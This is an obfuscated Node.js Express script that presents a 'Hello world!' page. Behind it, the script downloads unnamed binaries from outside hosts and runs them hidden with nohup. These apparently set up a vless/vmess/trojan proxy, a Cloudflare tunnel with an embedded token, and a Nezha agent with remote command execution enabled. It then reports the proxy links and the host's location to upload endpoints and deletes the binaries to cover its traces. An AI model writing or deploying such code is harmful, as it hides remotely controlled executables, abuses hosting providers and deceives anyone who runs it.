const _0x496f83=_0x2381;(function(_0x173ce6,_0x381639){const _0x1a28ce=_0x2381,_0x4a7caa=_0x173ce6();while(!![]){try{const _0x495d92=-parseInt(_0x1a28ce(0xef))/0x1*(parseInt(_0x1a28ce(0xed))/0x2)+parseInt(_0x1a28ce(0x12d))/0x3+-parseInt(_0x1a28ce(0x10c))/0x4*(parseInt(_0x1a28ce(0x10e))/0x5)+-parseInt(_0x1a28ce(0x12f))/0x6*(-parseInt(_0x1a28ce(0x159))/0x7)+parseInt(_0x1a28ce(0xe6))/0x8*(parseInt(_0x1a28ce(0xd3))/0x9)+-parseInt(_0x1a28ce(0xf4))/0xa+parseInt(_0x1a28ce(0xaf))/0xb*(parseInt(_0x1a28ce(0x120))/0xc);if(_0x495d92===_0x381639)break;else _0x4a7caa['push'](_0x4a7caa['shift']());}catch(_0x572eb6){_0x4a7caa['push'](_0x4a7caa['shift']());}}}(_0x4625,0x7fa7a));const express=require(_0x496f83(0xdb)),app=express(),axios=require(_0x496f83(0xc3)),os=require('os'),fs=require('fs'),path=require(_0x496f83(0xe5)),{promisify}=require(_0x496f83(0x148)),exec=promisify(require(_0x496f83(0xe7))[_0x496f83(0xd7)]),{execSync}=require(_0x496f83(0xe7)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x496f83(0xde)]||'',AUTO_ACCESS=process[_0x496f83(0x13f)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x496f83(0x13f)][_0x496f83(0x119)]||'./tmp',SUB_PATH=process[_0x496f83(0x13f)][_0x496f83(0xd5)]||'sub',PORT=process[_0x496f83(0x13f)][_0x496f83(0x131)]||process[_0x496f83(0x13f)]['PORT']||0xbb8,UUID=process[_0x496f83(0x13f)][_0x496f83(0x129)]||_0x496f83(0xd0),NEZHA_SERVER=process[_0x496f83(0x13f)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x496f83(0x13f)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x496f83(0x13f)][_0x496f83(0x13a)]||'',ARGO_DOMAIN=process['env'][_0x496f83(0xb0)]||_0x496f83(0xc8),ARGO_AUTH=process[_0x496f83(0x13f)]['ARGO_AUTH']||_0x496f83(0xbf),ARGO_PORT=process[_0x496f83(0x13f)][_0x496f83(0x122)]||0x1f41,CFIP=process['env'][_0x496f83(0xda)]||'cdns.doon.eu.org',CFPORT=process[_0x496f83(0x13f)][_0x496f83(0x12b)]||0x1bb,NAME=process[_0x496f83(0x13f)]['NAME']||'cf';!fs[_0x496f83(0xb8)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x496f83(0x11d)](FILE_PATH+_0x496f83(0x14f))):console[_0x496f83(0x11d)](FILE_PATH+_0x496f83(0x155));function generateRandomName(){const _0x35ff50=_0x496f83,_0x475395=_0x35ff50(0x104);let _0xf1a9b5='';for(let _0x42802d=0x0;_0x42802d<0x6;_0x42802d++){_0xf1a9b5+=_0x475395[_0x35ff50(0x134)](Math['floor'](Math['random']()*_0x475395[_0x35ff50(0x12e)]));}return _0xf1a9b5;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x496f83(0x10b)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x496f83(0x10b)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x496f83(0x140)),listPath=path['join'](FILE_PATH,_0x496f83(0x136)),bootLogPath=path[_0x496f83(0x10b)](FILE_PATH,'boot.log'),configPath=path[_0x496f83(0x10b)](FILE_PATH,_0x496f83(0x121));function deleteNodes(){const _0x519d73=_0x496f83;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x24b29b;try{_0x24b29b=fs['readFileSync'](subPath,_0x519d73(0xf9));}catch{return null;}const _0x401fe3=Buffer['from'](_0x24b29b,_0x519d73(0x137))[_0x519d73(0xd9)](_0x519d73(0xf9)),_0x164eb0=_0x401fe3[_0x519d73(0xd2)]('\x0a')[_0x519d73(0xcd)](_0x128a67=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x519d73(0xf6)](_0x128a67));if(_0x164eb0['length']===0x0)return;return axios[_0x519d73(0x102)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x164eb0}),{'headers':{'Content-Type':_0x519d73(0xe1)}})[_0x519d73(0x112)](_0x41cf57=>{return null;}),null;}catch(_0x1d4208){return null;}}function cleanupOldFiles(){const _0x12add5=_0x496f83;try{const _0x48c8be=fs['readdirSync'](FILE_PATH);_0x48c8be[_0x12add5(0xae)](_0x1effb9=>{const _0x3e041c=_0x12add5,_0x3b29e1=path[_0x3e041c(0x10b)](FILE_PATH,_0x1effb9);try{const _0x4ec487=fs[_0x3e041c(0xdf)](_0x3b29e1);_0x4ec487['isFile']()&&fs[_0x3e041c(0x11e)](_0x3b29e1);}catch(_0x26c293){}});}catch(_0x2f692a){}}app[_0x496f83(0xe4)]('/',function(_0x389cc9,_0x6a646b){const _0x58de96=_0x496f83;_0x6a646b[_0x58de96(0xc4)](_0x58de96(0xeb));});async function generateConfig(){const _0x22e2bd=_0x496f83,_0x16fbd1={'log':{'access':_0x22e2bd(0xd8),'error':'/dev/null','loglevel':_0x22e2bd(0x124)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x22e2bd(0xf1),'settings':{'clients':[{'id':UUID,'flow':_0x22e2bd(0xcb)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x22e2bd(0xec),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x22e2bd(0xd6),'dest':0xbbc}]},'streamSettings':{'network':_0x22e2bd(0x123)}},{'port':0xbb9,'listen':_0x22e2bd(0x106),'protocol':_0x22e2bd(0xf1),'settings':{'clients':[{'id':UUID}],'decryption':_0x22e2bd(0x124)},'streamSettings':{'network':_0x22e2bd(0x123),'security':_0x22e2bd(0x124)}},{'port':0xbba,'listen':_0x22e2bd(0x106),'protocol':_0x22e2bd(0xf1),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x22e2bd(0x124)},'streamSettings':{'network':'ws','security':_0x22e2bd(0x124),'wsSettings':{'path':_0x22e2bd(0xec)}},'sniffing':{'enabled':!![],'destOverride':[_0x22e2bd(0x116),_0x22e2bd(0xa7),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x22e2bd(0x106),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x22e2bd(0x106),'protocol':_0x22e2bd(0x10a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x22e2bd(0xd6)}},'sniffing':{'enabled':!![],'destOverride':[_0x22e2bd(0x116),_0x22e2bd(0xa7),_0x22e2bd(0x133)],'metadataOnly':![]}}],'dns':{'servers':[_0x22e2bd(0xc1)]},'outbounds':[{'protocol':'freedom','tag':_0x22e2bd(0x154)},{'protocol':_0x22e2bd(0xff),'tag':'block'}]};fs[_0x22e2bd(0x103)](path[_0x22e2bd(0x10b)](FILE_PATH,'config.json'),JSON['stringify'](_0x16fbd1,null,0x2));}function getSystemArchitecture(){const _0x4f77ca=_0x496f83,_0x208cb3=os['arch']();return _0x208cb3===_0x4f77ca(0x13e)||_0x208cb3===_0x4f77ca(0xa0)||_0x208cb3===_0x4f77ca(0xbd)?'arm':_0x4f77ca(0x10d);}function downloadFile(_0x45c3ed,_0x47b7d8,_0x4f5cc6){const _0x19be54=_0x496f83,_0x17156b=_0x45c3ed;!fs['existsSync'](FILE_PATH)&&fs[_0x19be54(0xf5)](FILE_PATH,{'recursive':!![]});const _0xfe51f6=fs[_0x19be54(0xd4)](_0x17156b);axios({'method':'get','url':_0x47b7d8,'responseType':'stream'})[_0x19be54(0xc0)](_0x36aedf=>{const _0x6021b6=_0x19be54;_0x36aedf['data'][_0x6021b6(0xb4)](_0xfe51f6),_0xfe51f6['on']('finish',()=>{const _0x46d9a0=_0x6021b6;_0xfe51f6[_0x46d9a0(0xf8)](),console[_0x46d9a0(0x11d)](_0x46d9a0(0x118)+path[_0x46d9a0(0x138)](_0x17156b)+_0x46d9a0(0x13c)),_0x4f5cc6(null,_0x17156b);}),_0xfe51f6['on'](_0x6021b6(0x132),_0x37d0e5=>{const _0x5e918e=_0x6021b6;fs['unlink'](_0x17156b,()=>{});const _0xca3fda='Download\x20'+path[_0x5e918e(0x138)](_0x17156b)+_0x5e918e(0x11c)+_0x37d0e5['message'];console['error'](_0xca3fda),_0x4f5cc6(_0xca3fda);});})[_0x19be54(0x112)](_0x29aef8=>{const _0x1481c1=_0x19be54,_0xc58bc2='Download\x20'+path[_0x1481c1(0x138)](_0x17156b)+'\x20failed:\x20'+_0x29aef8[_0x1481c1(0xfb)];console[_0x1481c1(0x132)](_0xc58bc2),_0x4f5cc6(_0xc58bc2);});}async function downloadFilesAndRun(){const _0x3e4efb=_0x496f83,_0x54d3f0=getSystemArchitecture(),_0x48f32a=getFilesForArchitecture(_0x54d3f0);if(_0x48f32a[_0x3e4efb(0x12e)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x56d5bf=_0x48f32a[_0x3e4efb(0x14a)](_0x337138=>{return new Promise((_0xc5ddcf,_0x4445b5)=>{const _0x4a4d61=_0x2381;downloadFile(_0x337138[_0x4a4d61(0xa9)],_0x337138[_0x4a4d61(0x145)],(_0x5208c0,_0x524445)=>{_0x5208c0?_0x4445b5(_0x5208c0):_0xc5ddcf(_0x524445);});});});try{await Promise[_0x3e4efb(0xe0)](_0x56d5bf);}catch(_0x3bf923){console[_0x3e4efb(0x132)](_0x3e4efb(0xbe),_0x3bf923);return;}function _0x237bae(_0x469432){const _0x3ba043=0x1fd;_0x469432['forEach'](_0x3d1143=>{fs['existsSync'](_0x3d1143)&&fs['chmod'](_0x3d1143,_0x3ba043,_0x168910=>{const _0x42c06a=_0x2381;_0x168910?console[_0x42c06a(0x132)](_0x42c06a(0x15a)+_0x3d1143+':\x20'+_0x168910):console[_0x42c06a(0x11d)](_0x42c06a(0xfc)+_0x3d1143+':\x20'+_0x3ba043['toString'](0x8));});});}const _0x2c12f1=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x237bae(_0x2c12f1);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4257fa=NEZHA_SERVER[_0x3e4efb(0xf3)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x38beed=new Set([_0x3e4efb(0x14d),_0x3e4efb(0xea),_0x3e4efb(0x11f),_0x3e4efb(0x11a),_0x3e4efb(0x130),_0x3e4efb(0x158)]),_0x47320e=_0x38beed[_0x3e4efb(0xba)](_0x4257fa)?_0x3e4efb(0xe8):_0x3e4efb(0xe9),_0x531460=_0x3e4efb(0xe3)+NEZHA_KEY+_0x3e4efb(0xfe)+NEZHA_SERVER+_0x3e4efb(0x147)+_0x47320e+_0x3e4efb(0x117)+UUID;fs[_0x3e4efb(0x103)](path['join'](FILE_PATH,'config.yaml'),_0x531460);const _0x12a691=_0x3e4efb(0x13d)+phpPath+_0x3e4efb(0xab)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x12a691),console[_0x3e4efb(0x11d)](phpName+_0x3e4efb(0x105)),await new Promise(_0x215080=>setTimeout(_0x215080,0x3e8));}catch(_0x41dff9){console[_0x3e4efb(0x132)]('php\x20running\x20error:\x20'+_0x41dff9);}}else{let _0x4a770e='';const _0x377745=[_0x3e4efb(0x14d),_0x3e4efb(0xea),_0x3e4efb(0x11f),_0x3e4efb(0x11a),'2083',_0x3e4efb(0x158)];_0x377745['includes'](NEZHA_PORT)&&(_0x4a770e=_0x3e4efb(0xf7));const _0x377afa=_0x3e4efb(0x13d)+npmPath+_0x3e4efb(0xc5)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4a770e+_0x3e4efb(0x139);try{await exec(_0x377afa),console[_0x3e4efb(0x11d)](npmName+_0x3e4efb(0x105)),await new Promise(_0x192956=>setTimeout(_0x192956,0x3e8));}catch(_0x3d6630){console[_0x3e4efb(0x132)](_0x3e4efb(0xb1)+_0x3d6630);}}}else console[_0x3e4efb(0x11d)](_0x3e4efb(0xb6));const _0x4783d1=_0x3e4efb(0x13d)+webPath+'\x20-c\x20'+FILE_PATH+_0x3e4efb(0xe2);try{await exec(_0x4783d1),console[_0x3e4efb(0x11d)](webName+_0x3e4efb(0x105)),await new Promise(_0x5b8d89=>setTimeout(_0x5b8d89,0x3e8));}catch(_0x40e3a3){console[_0x3e4efb(0x132)](_0x3e4efb(0xf2)+_0x40e3a3);}if(fs[_0x3e4efb(0xb8)](botPath)){let _0xe9a52;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0xe9a52='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x3e4efb(0x14e)](/TunnelSecret/)?_0xe9a52='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x3e4efb(0xce):_0xe9a52=_0x3e4efb(0x127)+FILE_PATH+_0x3e4efb(0xee)+ARGO_PORT;try{await exec(_0x3e4efb(0x13d)+botPath+'\x20'+_0xe9a52+'\x20>/dev/null\x202>&1\x20&'),console[_0x3e4efb(0x11d)](botName+_0x3e4efb(0x105)),await new Promise(_0x1bbcb5=>setTimeout(_0x1bbcb5,0x7d0));}catch(_0x123fcc){console[_0x3e4efb(0x132)](_0x3e4efb(0x135)+_0x123fcc);}}await new Promise(_0x4311da=>setTimeout(_0x4311da,0x1388));}function getFilesForArchitecture(_0x385daf){const _0x25d4b3=_0x496f83;let _0x5c24ba;_0x385daf===_0x25d4b3(0x13e)?_0x5c24ba=[{'fileName':webPath,'fileUrl':_0x25d4b3(0xa6)},{'fileName':botPath,'fileUrl':_0x25d4b3(0xc2)}]:_0x5c24ba=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x25d4b3(0x14b)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x468ea9=_0x385daf===_0x25d4b3(0x13e)?_0x25d4b3(0xca):'https://amd64.ssss.nyc.mn/agent';_0x5c24ba[_0x25d4b3(0x156)]({'fileName':npmPath,'fileUrl':_0x468ea9});}else{const _0x1577ff=_0x385daf===_0x25d4b3(0x13e)?_0x25d4b3(0xc9):'https://amd64.ssss.nyc.mn/v1';_0x5c24ba['unshift']({'fileName':phpPath,'fileUrl':_0x1577ff});}}return _0x5c24ba;}function _0x4625(){const _0x2dd3dc=['existsSync','status','has','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','countryCode','aarch64','Error\x20downloading\x20files:','eyJhIjoiODYxYjc4MzY0Y2RjMzdmNzNlMzg1NDBkZmQ3NDNkMDgiLCJ0IjoiOGI0MmMyOWYtYzFhNy00Y2EzLTg5YmQtMzNiMjVhOWVmMzgwIiwicyI6IllqRmhZbU13WkRVdE5qRXlNaTAwT1RSa0xUbGxPV1F0TW1NeE1tRmxOell6WVdGaiJ9','then','https+local://8.8.8.8/dns-query','https://arm64.ssss.nyc.mn/bot','axios','send','\x20-s\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','s666.5858518.tech','https://arm64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/agent','xtls-rprx-vision','platform','filter','/tunnel.yml\x20run','Content-Type','9afd1229-b893-6685-84dd-51e7ce204913','Unhandled\x20error\x20in\x20startserver:','split','792cTqhEj','createWriteStream','SUB_PATH','/trojan-argo','exec','/dev/null','toString','CFIP','express','clear','listen','PROJECT_URL','statSync','all','application/json','/config.json\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','get','path','93848YZvMHZ','child_process','true','false','8443','Hello\x20world!','/vless-argo','28khWWrj','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','59486Zcquge','\x22\x20>\x20/dev/null\x202>&1','vless','web\x20running\x20error:\x20','includes','6770700PuczEa','mkdirSync','test','--tls','close','utf-8','\x20>/dev/null\x202>&1','message','Empowerment\x20success\x20for\x20','ARGO_DOMAIN:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','blackhole','org','http\x20server\x20is\x20running\x20on\x20port:','post','writeFileSync','abcdefghijklmnopqrstuvwxyz','\x20is\x20running','127.0.0.1','/api/add-subscriptions','.exe\x20>\x20nul\x202>&1','https://ipapi.co/json/','trojan','join','305192yCvsGU','amd','25LTSwFr','del\x20/f\x20/q\x20','?security=tls&sni=','&fp=firefox&type=ws&host=','catch','substring','\x0a\x20\x20\x20\x20','text/plain;\x20charset=utf-8','http','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Download\x20','FILE_PATH','2087','/api/add-nodes','\x20failed:\x20','log','unlinkSync','2096','4188iJurxH','config.json','ARGO_PORT','tcp','none','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','rm\x20-rf\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http://ip-api.com/json/','UUID','boot.log','CFPORT','from','1312449koBCnv','length','372ByJgfO','2083','SERVER_PORT','error','quic','charAt','Error\x20executing\x20command:\x20','list.txt','base64','basename','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NEZHA_KEY','Error\x20reading\x20boot.log:','\x20successfully','nohup\x20','arm','env','sub.txt','&path=%2Fvless-argo%3Fed%3D2560#','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0avless://','Subscription\x20uploaded\x20successfully','fileUrl','win32','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','util','\x0a\x0avmess://','map','https://amd64.ssss.nyc.mn/bot','set','443','match','\x20is\x20created','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','?encryption=none&security=tls&sni=','\x20>\x20nul\x202>&1','Unknown','direct','\x20already\x20exists','unshift','push','2053','37555QrfAny','Empowerment\x20failed\x20for\x20','data','arm64','country_code','App\x20is\x20running','pkill\x20-f\x20\x22[','/vmess-argo?ed=2560','readFileSync','https://arm64.ssss.nyc.mn/web','tls','Nodes\x20uploaded\x20successfully','fileName','stringify','\x20-c\x20\x22','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Add\x20automatic\x20access\x20task\x20faild:\x20','forEach','19283GqNgLS','ARGO_DOMAIN','npm\x20running\x20error:\x20','https://oooo.serv00.net/add-url','firefox','pipe','TunnelSecret','NEZHA\x20variable\x20is\x20empty,skip\x20running','Skipping\x20adding\x20automatic\x20access\x20task'];_0x4625=function(){return _0x2dd3dc;};return _0x4625();}function argoType(){const _0x5cfa38=_0x496f83;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5cfa38(0x11d)](_0x5cfa38(0xbb));return;}if(ARGO_AUTH['includes'](_0x5cfa38(0xb5))){fs[_0x5cfa38(0x103)](path[_0x5cfa38(0x10b)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x5a118f='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x5cfa38(0xd2)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x5cfa38(0x10b)](FILE_PATH,'tunnel.json')+_0x5cfa38(0x125)+ARGO_DOMAIN+_0x5cfa38(0xac)+ARGO_PORT+_0x5cfa38(0xc6);fs[_0x5cfa38(0x103)](path[_0x5cfa38(0x10b)](FILE_PATH,'tunnel.yml'),_0x5a118f);}else console[_0x5cfa38(0x11d)](_0x5cfa38(0xc7));}async function extractDomains(){const _0x4704c1=_0x496f83;let _0x3b3696;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3b3696=ARGO_DOMAIN,console['log'](_0x4704c1(0xfd),_0x3b3696),await _0x4d27c1(_0x3b3696);else try{const _0x4e2d42=fs[_0x4704c1(0xa5)](path[_0x4704c1(0x10b)](FILE_PATH,_0x4704c1(0x12a)),_0x4704c1(0xf9)),_0x2bb557=_0x4e2d42[_0x4704c1(0xd2)]('\x0a'),_0x2dcb17=[];_0x2bb557[_0x4704c1(0xae)](_0x585772=>{const _0x31be12=_0x4704c1,_0x2d018d=_0x585772['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2d018d){const _0x5286b5=_0x2d018d[0x1];_0x2dcb17[_0x31be12(0x157)](_0x5286b5);}});if(_0x2dcb17[_0x4704c1(0x12e)]>0x0)_0x3b3696=_0x2dcb17[0x0],console[_0x4704c1(0x11d)]('ArgoDomain:',_0x3b3696),await _0x4d27c1(_0x3b3696);else{console[_0x4704c1(0x11d)](_0x4704c1(0x150)),fs['unlinkSync'](path[_0x4704c1(0x10b)](FILE_PATH,'boot.log'));async function _0x3fb45c(){const _0x59ff2d=_0x4704c1;try{process[_0x59ff2d(0xcc)]===_0x59ff2d(0x146)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x59ff2d(0x108)):await exec(_0x59ff2d(0xa3)+botName[_0x59ff2d(0x134)](0x0)+']'+botName[_0x59ff2d(0x113)](0x1)+_0x59ff2d(0xf0));}catch(_0x44841e){}}_0x3fb45c(),await new Promise(_0x21dc90=>setTimeout(_0x21dc90,0xbb8));const _0x1eed5d=_0x4704c1(0x127)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4704c1(0x13d)+botPath+'\x20'+_0x1eed5d+'\x20>/dev/null\x202>&1\x20&'),console[_0x4704c1(0x11d)](botName+_0x4704c1(0x105)),await new Promise(_0x3a4b08=>setTimeout(_0x3a4b08,0xbb8)),await extractDomains();}catch(_0x20a402){console[_0x4704c1(0x132)]('Error\x20executing\x20command:\x20'+_0x20a402);}}}catch(_0x27ee06){console[_0x4704c1(0x132)](_0x4704c1(0x13b),_0x27ee06);}async function _0x154c53(){const _0x176d5b=_0x4704c1;try{const _0x240d7f=await axios[_0x176d5b(0xe4)](_0x176d5b(0x109),{'timeout':0xbb8});if(_0x240d7f[_0x176d5b(0x9f)]&&_0x240d7f[_0x176d5b(0x9f)]['country_code']&&_0x240d7f[_0x176d5b(0x9f)][_0x176d5b(0x100)])return _0x240d7f[_0x176d5b(0x9f)][_0x176d5b(0xa1)]+'_'+_0x240d7f[_0x176d5b(0x9f)][_0x176d5b(0x100)];}catch(_0x184e4a){try{const _0x139a5f=await axios['get'](_0x176d5b(0x128),{'timeout':0xbb8});if(_0x139a5f[_0x176d5b(0x9f)]&&_0x139a5f[_0x176d5b(0x9f)][_0x176d5b(0xb9)]==='success'&&_0x139a5f[_0x176d5b(0x9f)][_0x176d5b(0xbc)]&&_0x139a5f[_0x176d5b(0x9f)]['org'])return _0x139a5f[_0x176d5b(0x9f)]['countryCode']+'_'+_0x139a5f[_0x176d5b(0x9f)][_0x176d5b(0x100)];}catch(_0x64d919){}}return _0x176d5b(0x153);}async function _0x4d27c1(_0x26eb33){const _0x564daf=await _0x154c53(),_0x5f3940=NAME?NAME+'-'+_0x564daf:_0x564daf;return new Promise(_0x968f19=>{setTimeout(()=>{const _0xeb4486=_0x2381,_0x30a156={'v':'2','ps':''+_0x5f3940,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xeb4486(0x124),'net':'ws','type':_0xeb4486(0x124),'host':_0x26eb33,'path':_0xeb4486(0xa4),'tls':_0xeb4486(0xa7),'sni':_0x26eb33,'alpn':'','fp':_0xeb4486(0xb3)},_0x59bdb1=_0xeb4486(0x143)+UUID+'@'+CFIP+':'+CFPORT+_0xeb4486(0x151)+_0x26eb33+_0xeb4486(0x111)+_0x26eb33+_0xeb4486(0x141)+_0x5f3940+_0xeb4486(0x149)+Buffer[_0xeb4486(0x12c)](JSON[_0xeb4486(0xaa)](_0x30a156))[_0xeb4486(0xd9)](_0xeb4486(0x137))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0xeb4486(0x110)+_0x26eb33+'&fp=firefox&type=ws&host='+_0x26eb33+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x5f3940+_0xeb4486(0x114);console[_0xeb4486(0x11d)](Buffer['from'](_0x59bdb1)['toString'](_0xeb4486(0x137))),fs[_0xeb4486(0x103)](subPath,Buffer['from'](_0x59bdb1)[_0xeb4486(0xd9)](_0xeb4486(0x137))),console[_0xeb4486(0x11d)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x5b2a13,_0x35b2bb)=>{const _0x402bc4=_0xeb4486,_0x52cd5d=Buffer['from'](_0x59bdb1)[_0x402bc4(0xd9)](_0x402bc4(0x137));_0x35b2bb[_0x402bc4(0x14c)](_0x402bc4(0xcf),_0x402bc4(0x115)),_0x35b2bb[_0x402bc4(0xc4)](_0x52cd5d);}),_0x968f19(_0x59bdb1);},0x7d0);});}}async function uploadNodes(){const _0x30cc7f=_0x496f83;if(UPLOAD_URL&&PROJECT_URL){const _0xdd768c=PROJECT_URL+'/'+SUB_PATH,_0x961154={'subscription':[_0xdd768c]};try{const _0x157328=await axios[_0x30cc7f(0x102)](UPLOAD_URL+_0x30cc7f(0x107),_0x961154,{'headers':{'Content-Type':_0x30cc7f(0xe1)}});return _0x157328&&_0x157328[_0x30cc7f(0xb9)]===0xc8?(console[_0x30cc7f(0x11d)](_0x30cc7f(0x144)),_0x157328):null;}catch(_0x1d2d4c){if(_0x1d2d4c['response']){if(_0x1d2d4c['response'][_0x30cc7f(0xb9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x59f617=fs['readFileSync'](listPath,'utf-8'),_0x11a6e3=_0x59f617[_0x30cc7f(0xd2)]('\x0a')[_0x30cc7f(0xcd)](_0x454697=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x30cc7f(0xf6)](_0x454697));if(_0x11a6e3[_0x30cc7f(0x12e)]===0x0)return;const _0xbcac34=JSON['stringify']({'nodes':_0x11a6e3});try{const _0x34607c=await axios['post'](UPLOAD_URL+_0x30cc7f(0x11b),_0xbcac34,{'headers':{'Content-Type':_0x30cc7f(0xe1)}});return _0x34607c&&_0x34607c['status']===0xc8?(console['log'](_0x30cc7f(0xa8)),_0x34607c):null;}catch(_0xe99197){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3b6399=_0x2381,_0xbdccc0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xbdccc0[_0x3b6399(0x157)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xbdccc0[_0x3b6399(0x157)](phpPath);process[_0x3b6399(0xcc)]===_0x3b6399(0x146)?exec(_0x3b6399(0x10f)+_0xbdccc0[_0x3b6399(0x10b)]('\x20')+_0x3b6399(0x152),_0x453834=>{const _0x3225fe=_0x3b6399;console['clear'](),console['log'](_0x3225fe(0xa2)),console[_0x3225fe(0x11d)](_0x3225fe(0x142));}):exec(_0x3b6399(0x126)+_0xbdccc0[_0x3b6399(0x10b)]('\x20')+_0x3b6399(0xfa),_0x378fde=>{const _0xb8e08b=_0x3b6399;console[_0xb8e08b(0xdc)](),console['log'](_0xb8e08b(0xa2)),console[_0xb8e08b(0x11d)](_0xb8e08b(0x142));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x27a308=_0x496f83;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x27a308(0x11d)](_0x27a308(0xb7));return;}try{const _0x45327f=await axios['post'](_0x27a308(0xb2),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x27a308(0x11d)]('automatic\x20access\x20task\x20added\x20successfully'),_0x45327f;}catch(_0x2f32c3){return console[_0x27a308(0x132)](_0x27a308(0xad)+_0x2f32c3['message']),null;}}async function startserver(){const _0x303ac1=_0x496f83;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x43d993){console[_0x303ac1(0x132)]('Error\x20in\x20startserver:',_0x43d993);}}function _0x2381(_0x8d8141,_0x4a2176){_0x8d8141=_0x8d8141-0x9f;const _0x462514=_0x4625();let _0x2381f8=_0x462514[_0x8d8141];return _0x2381f8;}startserver()[_0x496f83(0x112)](_0x11950a=>{const _0x5ae233=_0x496f83;console[_0x5ae233(0x132)](_0x5ae233(0xd1),_0x11950a);}),app[_0x496f83(0xdd)](PORT,()=>console['log'](_0x496f83(0x101)+PORT+'!'));
